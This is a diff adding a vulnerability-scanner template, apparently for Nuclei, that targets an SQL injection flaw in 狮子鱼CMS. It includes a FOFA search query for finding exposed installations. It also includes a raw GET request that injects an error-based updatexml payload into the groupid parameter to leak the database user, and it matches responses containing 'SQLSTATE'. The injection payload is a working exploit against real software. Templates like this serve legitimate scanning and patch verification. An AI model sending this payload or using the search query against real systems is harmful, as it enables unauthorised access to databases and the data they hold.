@@ -1,0 +1,24 @@
+id: shiziyu-cms-sqli-2
+
+info:
+  name: "狮子鱼CMS SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/seller.php?s=/Public/login"
+          狮子鱼CMS（Content Management System）作为网站内容管理平台，其核心功能模块包含页面管理、博客系统、新闻发布及商品展示组件。经分析发现其存在SQL注入安全缺陷，攻击者可通过构造恶意请求获取数据库敏感信息。
+  tags: 狮子鱼CMS
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/Utility/file&do=image&groupid=123)%20or%20updatexml(1,concat(0x7e,user(),0x7e),1)--+ HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [404]
+  - type: word
+    part: body
+    words:
+    - 'SQLSTATE'
